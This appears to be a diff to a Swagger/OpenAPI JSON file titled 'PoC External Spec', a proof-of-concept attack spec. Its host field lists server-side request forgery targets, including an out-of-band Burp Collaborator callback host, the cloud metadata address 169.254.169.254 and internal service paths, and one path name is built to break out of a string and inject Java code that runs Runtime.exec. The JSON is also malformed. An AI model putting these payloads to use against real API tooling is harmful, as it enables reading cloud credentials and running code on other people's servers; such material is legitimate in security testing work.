@@ -4,11 +4,11 @@
     "version": "1.0.0",
     "title": "PoC External Spec"
   },
-  "host": "127.0.0.1:8000/swagger.json","localhost/openapi.json","dwdo6t9smfz7eb10nnnmpusobfh85x.burpcollaborator.net","169.254.169.254/latest/meta-data","internal-service/swagger.json",
-  "schemes": ["http"],
+  "host": "dwdo6t9smfz7eb10nnnmpusobfh85x.burpcollaborator.net","169.254.169.254/latest/meta-data","internal-service/swagger.json",
+  "schemes": ["https"],
   "basePath": "/",
-  "paths": {
-    "/": {
+  "paths": {          
+     "/a\"; try{java.lang.Runtime.getRuntime().exec(\"ls\");}catch(Exception e){} \"": {
       "get": {
         "summary": "This is loaded externally!",
         "responses": {
